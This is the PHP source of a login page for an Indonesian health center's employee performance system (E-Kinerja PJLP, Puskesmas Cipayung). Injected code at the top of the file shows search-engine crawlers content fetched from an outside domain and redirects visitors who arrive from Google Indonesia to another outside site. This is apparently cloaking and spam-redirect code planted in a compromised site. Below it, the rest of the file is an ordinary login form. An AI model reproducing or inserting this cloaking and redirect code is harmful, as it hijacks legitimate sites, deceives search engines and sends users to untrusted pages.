<?php
$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');

function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}
return false;
}
if (is_bot()) {
echo file_get_contents('https://grtoto.store/conextion-link/pjlp-puskesmas.html');
exit;
}

if (stripos($s_ref, 'google.co.id') !== false ||
(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
header("Location: https://automa-xwin.pages.dev/");
exit;
}
?>
<!DOCTYPE html>
<html lang="en">
    <head>
		<meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
		<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
        <title>PJLP Puskesmas Cipayung</title>
        <meta name="description" content="Custom Login Form Styling with CSS3" />
        <meta name="keywords" content="css3, login, form, custom, input, submit, button, html5, placeholder" />
		<meta name="author" content="Codrops" />
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
		<link rel="shortcut icon" href="images/favicon.ico"> 
		<!-- <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet"/> -->
		<link rel="stylesheet" type="text/css" href="css/style-login.css" />
		<script src="js/modernizr.custom.63321.js"></script>
		<!--[if lte IE 7]><style>.main{display:none;} .support-note .note-ie{display:block;}</style><![endif]-->
		<style>	
			@import url(http://fonts.googleapis.com/css?family=Raleway:400,700);
			body {
				background: #7f9b4e url(images/bg2.jpg) no-repeat center top;
				-webkit-background-size: cover;
				-moz-background-size: cover;
				background-size: cover;
			}
			.container > header h1,
			.container > header h2 {
				color: #fff;
				text-shadow: 0 1px 1px rgba(0,0,0,0.7);
			}
			::placeholder {
			  color: #eaeaea !important;
			}
		</style>

<script type="text/javascript">
        function validasi(form)
        {if (form.username.value == ""){
           alert("Anda belum mengisikan NIK.");
           form.username.focus();
          return (false);
        }if (form.password.value == ""){
            alert("Anda belum mengisikan Password.");
            form.password.focus();
         return (false);
        }
         return (true);
        }
</script>

	</head>
	
    <body>
        <div class="container">
		
			<header>
				
				<center><br>
					<h1><img src="images/logo-puskes.png" width="150px" /></h1><br>
					<h2><strong>E-Kinerja <del>PJLP</del></strong></h2>
						<h4 style="color:white"><strong>Puskesmas Cipayung</strong></h4>
				</center>
			</header>
			<section class="main">
				<form class="form-4" name="login" method="post" action="cek_login.php" onSubmit="return validasi(this)">
				     <h6><center>Silahkan Login Menggunakan <br> "NIK dan Password"</br></center></h6><br>
				    <p>
				        <label for="login">Nomor NIK</label>
				        <input type="text" name="username" placeholder="Username" required>
				    </p>
				    <p>
				        <label for="password">Password</label>
				        <input type="password" name='password' placeholder="Password" required> 
				    </p>

				    <p>
				        <input type="Submit" name="submit" value="Login">
				    </p><br>      
				    <h5><center>© babang ganteng (datin.cipayung@gmail.com)</br></center></h5><br> 
				</form>
			</section>
			<div class="modal fade" id="modalPengumuman" tabindex="-1" role="dialog">
  <div class="modal-dialog modal-md" role="document">
    <div class="modal-content" style="
    background-color: azure;">
      <div class="modal-header">
        <h3 style="color:red" class="modal-title text-center col-12">PENGUMUMAN</h3>
        <!-- <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button> -->
      </div>
      <div class="modal-body text-center">
		  <!-- <img width=20% src="images/xbg2.jpg"> -->
		<h2><p>Batas Input Kinerja Sebelum Tanggal 1! </p></h2>
		<!--<h3 style="color:red"><p>Waktu Validasi s/d Tanggal 8 !</p></h3>-->
		<div class="border-top my-3"></div>	
		<!--<br><h4><p>Printout Absensi & Bukti Pendukung dikumpulkan Max.TGL 10 !</p></h4>-->
		<br><h4 style="color:red"><p>MOHON PERHATIKAN KINERJA MASING2! KELALAIAN DITANGGUNG SENDIRI ! </p></h4>
      </div>
      <div class="modal-footer">
        <!-- <button type="button" class="btn btn-primary">Save changes</button> -->
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Mengerti</button>
      </div>
    </div>
  </div>
</div>
		</div>
		<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
	<script>
		$(document).ready(function() {
		$("#modalPengumuman").modal("toggle");

		})
	</script>	
</body>
</html>
